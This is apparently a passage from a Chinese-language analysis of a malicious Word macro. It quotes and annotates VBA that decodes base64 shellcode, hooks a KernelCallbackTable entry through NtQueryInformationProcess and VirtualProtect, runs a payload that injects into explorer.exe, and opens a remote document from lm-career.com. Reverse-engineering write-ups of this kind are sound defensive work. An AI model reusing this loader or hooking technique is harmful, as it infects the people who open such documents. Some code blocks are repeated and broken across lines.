Dim NullLong As Long
Dim MediaSectionLen As Long
For idx = 1 To UBound(MediaSection)
If CryptStringToBinaryW(StrPtr(MediaSection(idx)), Len(MediaSection(idx)), 
WM_CERTSYNCREAD, 0, VarPtr(MediaSectionLen), 0, 0) Then
If MediaSectionLen Then
If CryptStringToBinaryW(StrPtr(MediaSection(idx)), Len(MediaSection(idx)), 
WM_CERTSYNCREAD, WMCreateFileSink, VarPtr(MediaSectionLen), 0, 0) Then
'Private Const WM_CERTSYNCREAD = &H1(0x00000001)
WMCreateFileSink = WMCreateFileSink + MediaSectionLen
End If
End If
End If
Next idx
WMCheckURLScheme1 = WMCreateFileSink
'WMCheckURLScheme1为base64解码后的shellcode
WMCheckURLScheme1,WMCheckURLScheme2,WMCheckURLScheme3 --> DecodeBase64Shellcode
WMCreateIndexer --> SetFlagAfterExecute
WMIsAvailableOffline --> CheckRunningFlag
Private Function WMIsAvailableOffline() As Boolean
On Error Resume Next
If ThisDocument.Variables("WMCreateFileSink").Value <> "WMBackupSignal" Then
    WMIsAvailableOffline = False
Else
    WMIsAvailableOffline = True
End If
End Function
Private Sub Frame1_Layout()
On Error Resume Next
WMPlaybackHD = LoadLibraryA("WMVCORE.DLL")
'加载WMVCORE.dll
Dim wmorder2 As Long
Dim wmorder As Long
Dim WMVSDecpro As Long
#If Win64 Then
WMPlaybackRadd = 8
wmorder2 = &H58
wmorder = &H10
WMVSDecpro = Play_Encd
#Else
WMPlaybackRadd = 4
wmorder2 = &H2C
wmorder = &H8
WMVSDecpro = Play_Encd_Dcd
#End If
Dim WmEmptyData As LongPtr
Dim Ret As Long
Dim WMCreateFileSink As LongPtr
Dim WMModifyFSink As LongPtr
Dim capa As Long
Dim wsi As WMSCRINFO
Dim wmsct As LongPtr
Dim wmflash As LongPtr
Dim wmWnd As LongPtr
WMPlaybackSC = 0
If CheckRunningFlag() = False Then
    WMCreateFileSink = GetProcAddress(WMPlaybackHD, "WMIsAvailableOffline")
    '导出函数WMIsAvailableOffline
    Result = NtQueryInformationProcess(-1, 0, wsi, Len(wsi), capa)
    memcpy wmsct, ByVal (wsi.WmScrData2 + wmorder2), WMPlaybackRadd
    Ret = VirtualProtect(ByVal (WMCreateFileSink - 16), &H100000, Play_Encd, 
WmEmptyData)
    wmflash = wmsct + wmorder
    Ret = VirtualProtect(ByVal (wmflash), WMPlaybackRadd, WMVSDecpro, 
WmEmptyData)
    WMModifyFSink = WMCreateFileSink
    WMModifyFSink = DecodeBase64Shellcode(WMModifyFSink)
    WMModifyFSink = DecodeBase64Shellcode(WMModifyFSink)
其中比较核心的部分为:
    WMModifyFSink = DecodeBase64Shellcode(WMModifyFSink)
    memcpy ByVal (WMCreateFileSink - 16), ByVal (wmflash), WMPlaybackRadd
    Ret = VirtualProtect(ByVal (WMCreateFileSink - 16), &H100000, Play_Decd_Rdh, 
WmEmptyData)
    memcpy ByVal (wmflash), (WMCreateFileSink), WMPlaybackRadd
    If ThisDocument.ReadOnly = False Then
        SetFlagAfterExecute
        ThisDocument.Save
    End If
End If
Application.Documents.Open ("https://lm-career.com/careeroppr.docx") '打开远程文件
https://lm-career.com/careeroppr.docx
If ActiveDocument <> ThisDocument Then
    ThisDocument.Close
End If
End Sub
Private Const Play_Encd = &H4(4)
Private Const Play_Decd_Rdh = &H20(32)
Private Const Play_Encd_Dcd = &H40(64)
WMPlaybackHD = LoadLibraryA("WMVCORE.DLL")
'加载WMVCORE.dll
Dim wmorder2 As Long
Dim wmorder As Long
Dim WMVSDecpro As Long
#If Win64 Then
WMPlaybackRadd = 8
wmorder2 = &H58(88)
wmorder = &H10(16)
WMVSDecpro = Play_Encd
#Else
WMPlaybackRadd = 4
wmorder2 = &H2C(44)
wmorder = &H8(8)
WMVSDecpro = Play_Encd_Dcd
#End If
Dim WmEmptyData As LongPtr
Dim Ret As Long
Dim WMCreateFileSink As LongPtr
Dim WMModifyFSink As LongPtr
Dim capa As Long
Dim wsi As WMSCRINFO
Dim wmsct As LongPtr
Dim wmflash As LongPtr
Dim wmWnd As LongPtr
WMPlaybackSC = 0
首先是传递ProcessBasicInformation给NtQueryInformationProcess以获取PEB：
PROCESS_BASIC_INFORMATION结构体如下：
根据偏移获取PebBaseAddress进而获取KernelCallbackTable：
If CheckRunningFlag() = False Then
    WMCreateFileSink = GetProcAddress(WMPlaybackHD, "WMIsAvailableOffline")
    '导出函数WMIsAvailableOffline
    Result = NtQueryInformationProcess(-1, 0, wsi, Len(wsi), capa)
    memcpy wmsct, ByVal (wsi.WmScrData2 + wmorder2), WMPlaybackRadd
    Ret = VirtualProtect(ByVal (WMCreateFileSink - 16), &H100000, Play_Encd, 
WmEmptyData)
    wmflash = wmsct + wmorder
    Ret = VirtualProtect(ByVal (wmflash), WMPlaybackRadd, WMVSDecpro, 
WmEmptyData)
    WMModifyFSink = WMCreateFileSink
    WMModifyFSink = DecodeBase64Shellcode(WMModifyFSink)
    WMModifyFSink = DecodeBase64Shellcode(WMModifyFSink)
    WMModifyFSink = DecodeBase64Shellcode(WMModifyFSink)
    memcpy ByVal (WMCreateFileSink - 16), ByVal (wmflash), WMPlaybackRadd
    Ret = VirtualProtect(ByVal (WMCreateFileSink - 16), &H100000, Play_Decd_Rdh, 
WmEmptyData)
    memcpy ByVal (wmflash), (WMCreateFileSink), WMPlaybackRadd
    If ThisDocument.ReadOnly = False Then
        SetFlagAfterExecute
        ThisDocument.Save
    End If
End If
Result = NtQueryInformationProcess(-1, 0, ProcessInformation, 
Len(ProcessInformation), capa)
typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
memcpy KernelCallbackTable, ByVal (ProcessInformation.PebBaseAddress + 
KCT_Offset), WMPlaybackRadd
之后选择KernelCallbackTable中函数进行Hook：
替换的函数地址是之前获取到的WMIsAvailableOffline函数地址，但其内容已经被替换
当 user32.dll 加载到内存中时，KernelCallbackTable 被初始化为一个回调函数数组，每当进程进行图
形调用 (GDI) 时都会使用这些回调函数,而在本例子中64位被劫持 fnDWORDOPTINLPMSG 函数,32位被劫持
fnDWORD 函数恶意的shellcode就会运行
shellcode会解密加密的dll 然后将其运行 加密的dll会将 KernelCallbackTable 恢复到原始状态
再会执行shellcode注入到explorer.exe的操作
#If Win64 Then
WMPlaybackRadd = 8
KCT_Offset = &H58
wmorder = &H10         '__fnDWORDOPTINLPMSG
WMVSDecpro = Play_Encd
#Else
WMPlaybackRadd = 4
KCT_Offset = &H2C     'KernelCallbackTable Offset
wmorder = &H8         '__fnDWORD
WMVSDecpro = Play_Encd_Dcd
#End If
...
wmflash = KernelCallbackTable + wmorder
...
memcpy ByVal (wmflash), (WMCreateFileSink), WMPlaybackRadd
References
https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationpr
ocess
https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm
https://www.microsoft.com/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-def
eating-traps-tricks-and-complex-virtual-machines/
https://bbs.pediy.com/thread-261553.htm